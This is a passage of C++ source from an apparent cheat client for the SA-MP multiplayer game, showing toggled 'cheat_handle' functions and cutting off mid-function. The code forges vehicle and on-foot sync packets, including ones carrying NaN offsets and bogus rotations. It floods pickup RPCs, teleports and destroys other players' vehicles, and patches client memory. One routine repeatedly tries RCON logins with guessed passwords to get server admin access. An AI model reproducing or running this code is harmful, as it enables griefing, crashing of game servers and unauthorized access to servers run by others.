		render->D3DBoxBorder(cent.x - 20, cent.y - 30, 20, 30, D3DCOLOR_XRGB(255, 255, 255), D3DCOLOR_ARGB(0, 0, 0, 0));
		pD3DFontChat->Print(cent.x - 15, cent.y - 25, dwColor, "V");
	}
	inv ^= true;
}

bool LQ_CheckCursorInBoxUpVehTarget(int iSAMPVehicleID, DWORD dwColor) {
	vehicle_info *tar = getGTAVehicleFromSAMPVehicleID(iSAMPVehicleID);
	if (!tar) return false;
	D3DXVECTOR3 cent;
	D3DXVECTOR3 worldcoord;
	worldcoord.x = tar->base.matrix[12];
	worldcoord.y = tar->base.matrix[13];
	worldcoord.z = tar->base.matrix[14] + 1.5f;
	CalcScreenCoors(&worldcoord, &cent);
	if (cent.z < 1.0f) return false;
	float x, y;
	x = cent.x - 20;
	y = cent.y - 30;
	POINT pos;

	if (GetCursorPos(&pos)) {
		if (pos.x > x && pos.x < (x + 20)
			&& pos.y > y && pos.y < (y + 30))
			return true;
	}
	return false;
}

void cheat_handle_pAAAsSA1gjhjhg()
{
	traceLastFunc("cheat_handle_pAAAs()");
	if (cheat_state->_generic.pAAAsSA1hjjhjj == 1)
	{
		vehicle_info *vinfo = vehicle_info_get(VEHICLE_SELF, 0);
		static bool ihavecar = false;
		static int carid = 65535;
		if (!ihavecar) {
			//рисуем метки
			for (int i = 0; i < SAMP_VEHICLE_MAX; i++) {
				if (g_Vehicles
					&& g_Vehicles->pSAMP_Vehicle[i] != NULL
					&& g_Vehicles->pSAMP_Vehicle[i]->pGTA_Vehicle != NULL
					) {
					LQ_RenderBoxUpVehTarget(i, D3DCOLOR_XRGB(255, 0, 0));
				}
			}
			//проверяем нахождение курсора в какой нибудь метке если да и удерживается лкм то начинаем двигать по сути
			for (int i = 0; i < SAMP_VEHICLE_MAX; i++) {
				if (g_Vehicles
					&& g_Vehicles->pSAMP_Vehicle[i] != NULL
					&& g_Vehicles->pSAMP_Vehicle[i]->pGTA_Vehicle != NULL
					) {
					if (LQ_CheckCursorInBoxUpVehTarget(i, D3DCOLOR_XRGB(255, 0, 0))) {
						if (KEY_DOWN(VK_LBUTTON)) {
							carid = i;
							ihavecar = true;
							//	addMessageToChatWindow("carid: %i", carid);
							break;
						}
					}
				}
			}
		}
		else {
			//чекнем на всякий вдруг отпустили кнопку 
			if (!KEY_DOWN(VK_LBUTTON)) {
				ihavecar = false;
				carid = 65535;
				return;
			}
			//считаем оффсет думаю кара да и всё и ставим его там ?\_(?)_/?

			vehicle_info *tar = getGTAVehicleFromSAMPVehicleID(carid);
			if (!tar) {
				ihavecar = false;
				carid = 65535;
				return;
			}
			LQ_RenderBoxUpVehTarget(carid, D3DCOLOR_XRGB(255, 0, 0));
			//addMessageToChatWindow("carid: %i", carid);
			D3DXVECTOR3 cent;
			D3DXVECTOR3 worldcoord;
			POINT pos;
			if (GetCursorPos(&pos)) {
				float y = pos.y + 30;
				cent.x = pos.x;
				cent.y = y;
				cent.z = 700;

				CalcWorldCoors(&cent, &worldcoord);

				CVector vecTarget(worldcoord.x, worldcoord.y, worldcoord.z);

				// setup variables
				CVector				vecOrigin, vecGroundPos;
				CColPoint			*pCollision = nullptr;
				CEntitySAInterface	*pCollisionEntity = nullptr;

				// origin = our camera
				vecOrigin = *pGame->GetCamera()->GetCam(pGame->GetCamera()->GetActiveCam())->GetSource();

				// check for collision
				bool bCollision = GTAfunc_ProcessLineOfSight(&vecOrigin, &vecTarget, &pCollision, &pCollisionEntity,
					1, 1, 0, 1, 1, 0, 0, 0);

				if (bCollision && pCollision)
				{
					// calculate position to check for ground
					vecGroundPos = *pCollision->GetPosition();
					if (pCollisionEntity && pCollisionEntity->nType == ENTITY_TYPE_VEHICLE) return;
				}



				float pos[3];
				pos[0] = vecGroundPos.fX;
				pos[1] = vecGroundPos.fY;
				pos[2] = vecGroundPos.fZ + 1.0f;
				//if (vect3_dist(pos, &tar->base.matrix[12]) < 1.0f) return;
				//float speed[3] = { 0.0,0.0,0.0 };
				//SendFakeDriverSyncData(carid, pos, vinfo->hitpoints, speed, NULL);
			}
			else {
				ihavecar = false;
				carid = 65535;
				return;
			}

		}
	}
}*/




void cheat_handle_pAAAsSA1gjhjhg()
{
	traceLastFunc("cheat_handle_pAAAs()");
	if (cheat_state->_generic.pAAAsSA1hjjhjj == 1)
	{
		//int					nearest_id = vehicle_find_nearest(VEHICLE_ALIVE);
		//struct vehicle_info	*nearest;

		//if (nearest_id == -1) return;
		//if ((nearest = vehicle_info_get(nearest_id, VEHICLE_ALIVE)) == NULL) return;

		int					nearest_id = actor_find_nearest(ACTOR_ALIVE);
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;
		 
		stInCarData onSync;
		ZeroMemory(&onSync, sizeof(stInCarData));

		onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
		onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth;
		onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;
		onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;

		onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
		onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
		onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];

		onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
		onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
		onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];

		float fPos[3];
		vect3_copy(&nearest->base.matrix[4 * 3], fPos);

		onSync.fPosition[0] = fPos[0];
		onSync.fPosition[1] = fPos[1];
		onSync.fPosition[2] = fPos[2] += -1;
		onSync.fQuaternion[0] = 0.50f;
		onSync.fQuaternion[1] = -0.50f;
		onSync.fQuaternion[2] = 0.50f;
		onSync.fQuaternion[3] = 0.50f;
		onSync.fMoveSpeed[2] = fPos[2] += 10.0f;

		 BitStream bsData;
		bsData.Write((BYTE)ID_VEHICLE_SYNC);
		bsData.Write((PCHAR)&onSync, sizeof(stInCarData));
		//for (int i = 0; i < 2; i++)
		g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	}
	}

void cheat_handle_pAAAsSA1gjhjhgjjjj()
{
	traceLastFunc("cheat_handle_pAAAs()");
	if (cheat_state->_generic.pAAAsSA1hjjhjjdfdf == 1)
	{
		int					nearest_id = actor_find_nearest(ACTOR_ALIVE);
		struct actor_info	*nearest;

		if (nearest_id == -1) return;
		if ((nearest = actor_info_get(nearest_id, ACTOR_ALIVE)) == NULL) return;

		stInCarData onSync;
		ZeroMemory(&onSync, sizeof(stInCarData));

		onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
		onSync.fVehicleHealth = g_Players->pLocalPlayer->inCarData.fVehicleHealth;
		onSync.byteArmor = g_Players->pLocalPlayer->inCarData.byteArmor;
		onSync.bytePlayerHealth = g_Players->pLocalPlayer->inCarData.bytePlayerHealth;

		onSync.fPosition[0] = g_Players->pLocalPlayer->inCarData.fPosition[0];
		onSync.fPosition[1] = g_Players->pLocalPlayer->inCarData.fPosition[1];
		onSync.fPosition[2] = g_Players->pLocalPlayer->inCarData.fPosition[2];

		onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[0];
		onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[1];
		onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->inCarData.fMoveSpeed[2];

		float fPos[3];
		vect3_copy(&nearest->base.matrix[4 * 3], fPos);

		onSync.fPosition[0] = fPos[0];
		onSync.fPosition[1] = fPos[1];
		onSync.fPosition[2] = fPos[2] += -1;
		onSync.fQuaternion[0] = fPos[2] += 10.0f;
		onSync.fQuaternion[1] = fPos[2] += 10.0f;
		onSync.fQuaternion[2] = fPos[2] += 10.0f;
		onSync.fQuaternion[3] = fPos[2] += 10.0f;
		

		 BitStream bsData;
		bsData.Write((BYTE)ID_VEHICLE_SYNC);
		bsData.Write((PCHAR)&onSync, sizeof(stInCarData));
		//for (int i = 0; i < 2; i++)
		g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	}
}


void cheat_handle_pAAAsSA1()  
{  
  traceLastFunc( "cheat_handle_pAAAs()" );  
  if( cheat_state->_generic.pAAAsSA1 == 1 )  
  {
	for(int a=0;a<2;a++){
	 BitStream bsScmEvent;
	bsScmEvent.Write ( rand()%2000 );
	g_DrifeitClient->RPC(RPC_PickedUpPickup, &bsScmEvent, SYSTEM_PRIORITY, UNRELIABLE, 0, 0);
	}
  }}


void cheat_handle_pAAAsSA1d()
{
	traceLastFunc("cheat_handle_pAAAs()");
	if (cheat_state->_generic.pAAAsSA1d == 1)
	{
		static int iFriends = 0;
		float x = pPresentParam.BackBufferWidth - 250.0f;
		float yd = pPresentParam.BackBufferHeight / 2 + pD3DFontChat->DrawHeight() - 175;
		int flakhave = 0;
		int zenithcount = 0;
		for (int i = 0; i < SAMP_PLAYER_MAX; i++)
		{
			if (cheat_state->DrifeitPlayer.isDrifeitPlayer[i]) {
				flakhave = 1;
				zenithcount++;
			}
		} 
		if (flakhave == 0) return;
		render->D3DBox(x - 5.0f, pPresentParam.BackBufferHeight / 2 + pD3DFontChat->DrawHeight() - 175.0f, 260, 18 + 18 * zenithcount, D3DCOLOR_ARGB(111, 0, 0, 0));
		render->D3DBoxBorder(x - 5.0f, pPresentParam.BackBufferHeight / 2 + pD3DFontChat->DrawHeight() - 175.0f, 260, 18 + 18 * zenithcount, D3DCOLOR_XRGB(255, 165, 0), D3DCOLOR_XRGB(255, 125, 0));
		render->D3DBoxBorder(x - 5.0f, pPresentParam.BackBufferHeight / 2 + pD3DFontChat->DrawHeight() - 175.0f, 260, 18, D3DCOLOR_XRGB(255, 165, 0), D3DCOLOR_XRGB(255, 125, 0));
		pD3DFontChat->Print(x, yd, D3DCOLOR_XRGB(255, 125, 0), "Driftyu's Online: ");
		yd += pD3DFontChat->DrawHeight();
		for (int i = 0; i < SAMP_PLAYER_MAX; i++)
		{
			if (g_Players->iIsListed[i] == 0) cheat_state->DrifeitPlayer.isDrifeitPlayer[i] = false;
			if (cheat_state->DrifeitPlayer.isDrifeitPlayer[i]) {
				char buffer[256];
				//addMessageToChatWindow("PlayerID = %i", i);
				sprintf(buffer, "%s [ID: %i] ver: %.1f", g_Players->pRemotePlayer[i]->szPlayerName, i, cheat_state->DrifeitPlayer.iDrifeitVer[i]);
				pD3DFont->Print(x, yd, samp_color_get(i), buffer);
				yd += pD3DFontChat->DrawHeight() + 2.0f;
			}
		}
	}
}
	



void cheat_handle_pAAAsee()  
{  
	traceLastFunc("cheat_handle_pAAAsee()");
		if (cheat_state->_generic.infobar == 1)
		{
			int iLastGameState = 0;
			char CurrentGameStateName[32];
			char szInfo[256];
			bool bUnkState = 0;

			if (iLastGameState != g_SAMP->iGameState)
			{
				switch (g_SAMP->iGameState)
				{
				case GAMESTATE_CONNECTING:
					sprintf_s(CurrentGameStateName, sizeof(CurrentGameStateName), "Подключение");
					break;

				case GAMESTATE_CONNECTED:
					sprintf_s(CurrentGameStateName, sizeof(CurrentGameStateName), "Подключено");
					break;

				case GAMESTATE_AWAIT_JOIN:
					sprintf_s(CurrentGameStateName, sizeof(CurrentGameStateName), "Ожидание подключения");
					break;

				case GAMESTATE_RESTARTING:
					sprintf_s(CurrentGameStateName, sizeof(CurrentGameStateName), "Перезапуск режима");
					break;

				case GAMESTATE_WAIT_CONNECT:
					sprintf_s(CurrentGameStateName, sizeof(CurrentGameStateName), "Ждать подключения");
					break;

				default:
					bUnkState = 1;
					break;
				}
			}

			if (!bUnkState)
				iLastGameState = g_SAMP->iGameState;
			int iStreamedPlayers = 0,
				iStreamedVehicles = 0;

			for (int x = 0; x < SAMP_PLAYER_MAX; x++)
			{
				if (g_SAMP->iGameState != GAMESTATE_CONNECTED)
					continue;



				if (!g_SAMP->pPools.pPool_Player)
					continue;

				if (g_SAMP->pPools.pPool_Player->sLocalPlayerID == x)
					continue;

				if (!g_SAMP->pPools.pPool_Player->pRemotePlayer[x])
					continue;

				if (!g_SAMP->pPools.pPool_Player->pRemotePlayer[x]->pPlayerData)
					continue;

				if (g_SAMP->pPools.pPool_Player->pRemotePlayer[x]->pPlayerData->pSAMP_Actor != NULL)
					iStreamedPlayers++;
			}
			for (int x = 0; x < SAMP_VEHICLE_MAX; x++)
			{
				if (g_SAMP->iGameState != GAMESTATE_CONNECTED)
					continue;



				if (!g_SAMP->pPools.pPool_Vehicle)
					continue;

				if (g_SAMP->pPools.pPool_Vehicle->pGTA_Vehicle[x] != NULL)
					iStreamedVehicles++;
			}
			/////////////////////////////////////
			if (g_Players && g_Players->pLocalPlayer && g_Players->pLocalPlayer->iIsActive && cheat_state->_generic.infobar && !gta_menu_active())
			{
				DamageVehicle11();
				int amount_players = getPlayerCount();
				SYSTEMTIME time;
				GetLocalTime(&time);
				char buffer[256]; 
				render->D3DBox(pPresentParam.BackBufferWidth - 280.0f, pPresentParam.BackBufferHeight - 268.0f, 270.0f, 220.0f, D3DCOLOR_ARGB(111, 0, 0, 0));
				_snprintf_s(buffer, sizeof(buffer) - 1, "======WWW.ZETA-HACK.RU======", iStreamedPlayers, iStreamedVehicles);
				pD3DFont->PrintShadow(pPresentParam.BackBufferWidth - 275.0f, pPresentParam.BackBufferHeight - 270.0f, D3DCOLOR_XRGB(rand() % 255, rand() % 255, rand() % 255), buffer);
				_snprintf_s(buffer, sizeof(buffer) - 1, "Streamed: Players: %d | Cars: %d", iStreamedPlayers, iStreamedVehicles);
				pD3DFont->PrintShadow(pPresentParam.BackBufferWidth - 275.0f, pPresentParam.BackBufferHeight - 250.0f, D3DCOLOR_XRGB(255, 165, 0), buffer);
				_snprintf_s(buffer, sizeof(buffer) - 1, "%s:%d | Игроков: %d", g_SAMP->szIP, g_SAMP->ulPort, amount_players);
				pD3DFont->PrintShadow(pPresentParam.BackBufferWidth - 275.0f, pPresentParam.BackBufferHeight - 230.0f, D3DCOLOR_XRGB(255, 165, 0), buffer);
				_snprintf_s(buffer, sizeof(buffer) - 1, "Режим: %s", CurrentGameStateName);
				pD3DFont->PrintShadow(pPresentParam.BackBufferWidth - 275.0f, pPresentParam.BackBufferHeight - 210.0f, D3DCOLOR_XRGB(255, 165, 0), buffer);
				_snprintf_s(buffer, sizeof(buffer) - 1, "Дата %02d/%02d/%02d Часы %02d:%02d:%02d", time.wDay, time.wMonth, time.wYear, time.wHour, time.wMinute, time.wSecond);
				pD3DFont->PrintShadow(pPresentParam.BackBufferWidth - 275.0f, pPresentParam.BackBufferHeight - 190.0f, D3DCOLOR_XRGB(255, 165, 0), buffer);
				_snprintf_s(buffer, sizeof(buffer) - 1, "Очки(LVL): %d Анимация: %d", g_Players->iLocalPlayerScore, g_Players->pLocalPlayer->iCurrentAnimID);
				pD3DFont->PrintShadow(pPresentParam.BackBufferWidth - 275.0f, pPresentParam.BackBufferHeight - 170.0f, D3DCOLOR_XRGB(255, 165, 0), "Ник(ID):");
				pD3DFont->PrintShadow(pPresentParam.BackBufferWidth - 275.0f, pPresentParam.BackBufferHeight - 150.0f, D3DCOLOR_XRGB(255, 165, 0), buffer);
				_snprintf_s(buffer, sizeof(buffer) - 1, "%s (%d)", getPlayerName(g_Players->sLocalPlayerID), g_Players->sLocalPlayerID);
				pD3DFont_sampStuff->PrintShadow(pPresentParam.BackBufferWidth - 215.0f, pPresentParam.BackBufferHeight - 170.0f, samp_color_get(g_Players->sLocalPlayerID), buffer);
				_snprintf_s(buffer, sizeof(buffer) - 1, "Здоровье: %.01f Броня: %.01f", actor_info_get(-1, 0)->hitpoints, actor_info_get(-1, 0)->armor);
				pD3DFont->PrintShadow(pPresentParam.BackBufferWidth - 275.0f, pPresentParam.BackBufferHeight - 130.0f, D3DCOLOR_XRGB(255, 165, 0), buffer);
				_snprintf_s(buffer, sizeof(buffer) - 1, "Интерьер: %d Оружие: %d", g_Players->pLocalPlayer->byteCurrentInterior, g_Players->pLocalPlayer->byteCurrentWeapon);
				pD3DFont->PrintShadow(pPresentParam.BackBufferWidth - 275.0f, pPresentParam.BackBufferHeight - 110.0f, D3DCOLOR_XRGB(255, 165, 0), buffer);
				int vehid = g_Players->pLocalPlayer->sCurrentVehicleID;
				if (vehid != 65535) _snprintf_s(buffer, sizeof(buffer) - 1, "Пинг: %d Авто: %d Скорость: %0.f", g_Players->iLocalPlayerPing, vehid, vect3_length(g_Vehicles->pGTA_Vehicle[vehid]->speed) * 100);
				else _snprintf_s(buffer, sizeof(buffer) - 1, "Пинг: %d Авто: нет Скорость: %0.f", g_Players->iLocalPlayerPing, vect3_length(actor_info_get(-1, 0x01)->speed) * 100);
				pD3DFont->PrintShadow(pPresentParam.BackBufferWidth - 275.0f, pPresentParam.BackBufferHeight - 90.0f, D3DCOLOR_XRGB(255, 165, 0), buffer);
				if (vehid != 65535) _snprintf_s(buffer, sizeof(buffer) - 1, "Состояние автомобиля: %.01f.", g_Players->pLocalPlayer->inCarData.fVehicleHealth);
				else _snprintf_s(buffer, sizeof(buffer) - 1, "Состояние автомобиля: нет.");
				pD3DFont->PrintShadow(pPresentParam.BackBufferWidth - 275.0f, pPresentParam.BackBufferHeight - 70.0f, D3DCOLOR_XRGB(255, 165, 0), buffer);
			}
		}
	}


void cheat_handle_pickm2()  
{  
  traceLastFunc( "cheat_handle_pickm2()" );  
  if( cheat_state->_generic.pickm2 == 1 )  
  {   
  float cpos[3] = {pPedSelf->GetPosition()->fX,pPedSelf->GetPosition()->fY,pPedSelf->GetPosition()->fZ};
  float spd[3] = {0,0,0};
  spd[0] = (float)(rand() % 10);
  spd[1] = (float)(rand() % 10);
  spd[2] = 0;
  float fQuaternion[4] = {0,0,0};
  SendFakeDriverSyncData1(g_Players->pLocalPlayer->sCurrentVehicleID, cpos, 1000, spd, fQuaternion, 0);
  }} 

void cheat_handle_spawner()  
{  
  traceLastFunc( "cheat_handle_spawner()" );  
  if( cheat_state->_generic.spawner == 1 )  
  {
	struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}

		float fPos[3];
		vect3_copy( &self->base.matrix[4 * 3], fPos );

		// 1st version
		fPos[0] += (sinf(-self->fCurrentRotation) * 20.0f);
		fPos[1] += (cosf(-self->fCurrentRotation) * 20.0f);
		fPos[2] += 2.0f;
		
		float fSpeed[3] = { 0.0f, 0.0f, 0.0f };

		float fQuaternion[4] = { +9.0f, +9.0f, +6.75f };

		INCAR_SYNC_DATA vehSync;
		memset(&vehSync, 0, sizeof(INCAR_SYNC_DATA));

		vehSync.VehicleID = iSAMPVehicleID;
		vehSync.vecPos[0] = fPos[0];
		vehSync.vecPos[1] = fPos[1];
		vehSync.vecPos[2] = fPos[2];
		vehSync.fCarHealth = vinfo->hitpoints;
		vehSync.vecMoveSpeed[0] = fSpeed[0];
		vehSync.vecMoveSpeed[1] = fSpeed[1];
		vehSync.vecMoveSpeed[2] = fSpeed[2];
		vehSync.wKeys = 0;
		vehSync.bytePlayerHealth = self->hitpoints;

		SendFakeDriverFullSyncData(&vehSync, 0);

		cheat_vehicle_teleport( vinfo, fPos, gta_interior_id_get() );

		vinfo->speed[0] = fSpeed[0];
		vinfo->speed[1] = fSpeed[1];
		vinfo->speed[2] = fSpeed[2];

		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
			v = 0;	
} 
  } 

  void cheat_handle_pickm21()  
{  
  traceLastFunc( "cheat_handle_pickm21()" );  
  if( cheat_state->_generic.pickm21 == 1 )  
  {  
	 memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x7F120E), 0x00, 1);
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x7F120E), 0x6E7, 1);
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x7F120E), 0x6E7, 1);
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x7F120E), 0x6E7, 1);
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x7F120E), 0x00, 1);
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x6E7), 0x00, 1);
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x6E7), 0x7F120E, 1);
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x7F120E), 0xC3, 1);
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x7F120E), 0xEB, 1);
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x6E7), 0xC3, 1);
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x6E7), 0xEB, 1);

	  memset_safe((DWORD*)(g_dwSAMP_Addr + 0x10B7F8), 0x00, 1); 
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x61430), 0xC3, 1); 
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x5B68B), 0xEB, 1); 
	  memset_safe((uint32_t *)(g_dwSAMP_Addr + 0x71410), 0xEB, 1);
	 
	  }}


  void cheat_handle_pickm21ss()  
{  
  traceLastFunc( "cheat_handle_pickm21()" );  
  if( cheat_state->_generic.pickm21ss == 1 )  
  {  
	 RenderPickupTexts ();
	  RenderObjectTexts ();
	  renderVehicleTags ();
	  
	}}

  /*struct vehicle_info *info = vehicle_info_get( VEHICLE_SELF, 0 );
	   struct actor_info    *infop = actor_info_get( ACTOR_SELF, 0 );     
		float coord[3];
		coord[0] = pPedSelf->GetPosition()->fX;
		coord[1] = pPedSelf->GetPosition()->fY;
		coord[2] = pPedSelf->GetPosition()->fZ;
		float speed[3];
		vect3_copy( &infop->base.matrix[4 * 3], speed );
		speed[0] = (float)(0.3f);
		speed[1] = (float)(0.3f);
		speed[2] = 0; 
		SendFakeOnfootSyncData ( coord, speed );*/

 
  void cheat_handle_pickm216()  
{  
  traceLastFunc( "cheat_handle_pickm216()" );  
  if( cheat_state->_generic.pickm216 == 1 )  
  {  
	struct actor_info	*self = actor_info_get( ACTOR_SELF, 0 );

		static int v = 0;

		if ( g_Vehicles->iIsListed[v] != 1 )
			goto find_another_car;

		int car_id = (int)( ((DWORD) g_Vehicles->pGTA_Vehicle[v]) - (DWORD) pool_vehicle->start ) / 2584;
		struct vehicle_info	*vinfo = vehicle_info_get( car_id, 0 );

		int iSAMPVehicleID = getSAMPVehicleIDFromGTAVehicle(vinfo);
		if(iSAMPVehicleID == g_Players->pLocalPlayer->sCurrentVehicleID)
		{
			v++;
			goto find_another_car;
		}	
		SendFakeCarDeath(iSAMPVehicleID);
		v++;

find_another_car:
		for ( v; v < SAMP_VEHICLE_MAX; v++ )
		{
			if ( g_Vehicles->iIsListed[v] == 1 )
				break;
		}

		if ( v >= SAMP_VEHICLE_MAX )
			v = 0;	
	}
	  }

  void gen_random(char *s, const int len)
{
	static const char alphanum[] =
		"assaA"
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz";

	for (int i = 0; i < len; ++i)
		s[i] = alphanum[rand() % (sizeof(alphanum) - 1)];

	s[len] = 0;
}


  void cheat_handle_pickm2161()  
{  
  traceLastFunc( "cheat_handle_pickm2161()" );  
  if( cheat_state->_generic.pickm2161 == 1 )  
  {  
	  static int time = 0;
if (GetTickCount() - 2400 > time)
{
		char nick[15] = {0};
		gen_random(nick, 5);
		setLocalPlayerName(nick); //ставим локальное имя(видим только мы)   
		disconnect( 500 );//дисконнкет от сервера(выход)   
		restartGame();//рестарт игры   
		g_SAMP->iGameState = 26;//ставим геймстейт(26 - ожидание подключения)
		time = GetTickCount();
}}
	  }
	  
  

  void cheat_handle_aaaaa()
{
	 traceLastFunc( "cheat_handle_aaaaa()" ); 
	if( cheat_state->_generic.fake120 == 1 ) 
		{ 
			for(int ccflood = 0; ccflood < 3;ccflood++)
			{
			bool vehPanelStatus = rand()%999999999999999999+4;
			vehPanelStatus = rand()%-999999999999999999-4;
			bool vehDoorStatus = rand()%999999999999999999+4;
			vehDoorStatus = rand()%-999999999999999999-4;
			int vehLightStatus = rand()%999999999999999999+4;
			vehLightStatus = rand()%999999999999999999-4;
			int vehTireStatus = rand()%999999999999999999+4;
			vehTireStatus = rand()%999999999999999999-4;
			int vehTireTest = rand()%999999999999999999+4;
			vehTireTest = rand()%999999999999999999-4;
			int vehTireTests = rand()%999999999999999999+4;
			vehTireTest = rand()%999999999999999999-4;
			DamageVehicle(g_Players->pLocalPlayer->sCurrentVehicleID, vehPanelStatus, vehDoorStatus, vehLightStatus, vehTireStatus, vehTireTest, vehTireTests);
		}
	}}

 void cheat_handle_pickmaa()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.pickmaa == 1 )  
  {  
	 
  float fValue = (float)80; 
  float cpos[3] = {pPedSelf->GetPosition()->fX,pPedSelf->GetPosition()->fY,pPedSelf->GetPosition()->fZ};
  float spd[3];
  spd[2] = (float)90;
  float fQuaternion[4] = {0,0,0,0};
  cpos[2] = fValue;
 SendFakeDriverSyncData1(g_Players->pLocalPlayer->sCurrentVehicleID, cpos, 1000, spd, fQuaternion, 0);
	}}

 void sendServerCommand(char *szCommand)
{
	if (!strnicmp(szCommand+1, "rcon", 4))
	{
		 BitStream bsSend;
		bsSend.Write((BYTE)ID_RCON_COMMAND);
		DWORD len = strlen(szCommand+4);
		if (len > 0) {	
			bsSend.Write(len);
			bsSend.Write(szCommand+6, len);
		} else {
			bsSend.Write(len);
			bsSend.Write(szCommand+5, len);
		}
		g_DrifeitClient->Send(&bsSend, HIGH_PRIORITY, RELIABLE, 0);
	}
	else
	{
		 BitStream bsParams;
		int iStrlen = strlen(szCommand);
		bsParams.Write(iStrlen);
		bsParams.Write(szCommand, iStrlen);
		g_DrifeitClient->RPC(RPC_ServerCommand, &bsParams, HIGH_PRIORITY, RELIABLE_ORDERED, 0, 0);
	}
}

 void cheat_handle_pickmaasssssswqzzq141aaazzz()  
{  
  traceLastFunc( "cheat_handle_pickmaa()" );  
  if( cheat_state->_generic.asasasas9ssss == 1 )  
  { 
	 sendServerCommand("/rcon login wqwqwqwqwwdsffg1");
	sendServerCommand("/rcon login wqwqwqwqwwdsffg2");
	sendServerCommand("/rcon login wqwqwqwqwwdsffg3");
	sendServerCommand("/rcon login wqwqwqwqwwdsffg4");
	sendServerCommand("/rcon login wqwqwqwqwwdsffg5");
	sendServerCommand("/rcon login wqwqwqwqwwdsffg6");
	sendServerCommand("/rcon login wqwqwqwqwwdsffg7");
	sendServerCommand("/rcon login wqwqwqwqwwdsg8");
	sendServerCommand("/rcon login wqwqwqwqwwdsffg9");
	}}



 void cheat_handle_pickmaasssssswqzzq141aaazzzv()
 {
	 traceLastFunc("cheat_handle_pickmaa()");
	 if (cheat_state->_generic.asasasas9ssssv == 1)
	 {
		 stOnFootData onSync;
		 ZeroMemory(&onSync, sizeof(stOnFootData));

		 onSync.byteHealth = g_Players->pLocalPlayer->onFootData.byteHealth;
		 onSync.byteArmor = g_Players->pLocalPlayer->onFootData.byteArmor;

		 onSync.fPosition[0] = g_Players->pLocalPlayer->onFootData.fPosition[0];
		 onSync.fPosition[1] = g_Players->pLocalPlayer->onFootData.fPosition[1];
		 onSync.fPosition[2] = g_Players->pLocalPlayer->onFootData.fPosition[2];

		 onSync.fMoveSpeed[0] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[0];
		 onSync.fMoveSpeed[1] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[1];
		 onSync.fMoveSpeed[2] = g_Players->pLocalPlayer->onFootData.fMoveSpeed[2];

		 int	nearestCar = 0;
		 for (int v = 0; v < SAMP_VEHICLE_MAX; v++)
		 {
			 if (g_Vehicles->iIsListed[v] != 1)
				 continue;

			 int car_id = (int)(((DWORD)g_Vehicles->pGTA_Vehicle[v]) - (DWORD)pool_vehicle->start) / 2584;
			 struct vehicle_info	*vinfo = vehicle_info_get(car_id, 0);
			 nearestCar = getSAMPVehicleIDFromGTAVehicle(vinfo);
		 }
		 onSync.sSurfingVehicleID = nearestCar;
		 for (int i = 0; i < 1; i++)
			 onSync.fSurfingOffsets[i] = NAN;

		  BitStream bsData;
		 bsData.Write((BYTE)ID_PLAYER_SYNC);
		 bsData.Write((PCHAR)&onSync, sizeof(stOnFootData));
		 g_DrifeitClient->Send(&bsData, SYSTEM_PRIORITY, UNRELIABLE, 0);
	 }
 }


 


 void cheat_handle_pickmaasssssswqzzq141aaazzzvg()
 {
	 traceLastFunc("cheat_handle_pickmaa()"); 
	 if (cheat_state->_generic.asasasas9ssssvg == 1)
	 {
		 
	 }
 }


 void cheat_handle_pickmaasssssswqzzq141aaazzzvg1()
 {
	 traceLastFunc("cheat_handle_pickmaa()");
	 if (cheat_state->_generic.asasasas9ssssv1 == 1)
	 {
		 stInCarData onSync;
		 ZeroMemory(&onSync, sizeof(stInCarData));

		 onSync.sVehicleID = g_Players->pLocalPlayer->sCurrentVehicleID;
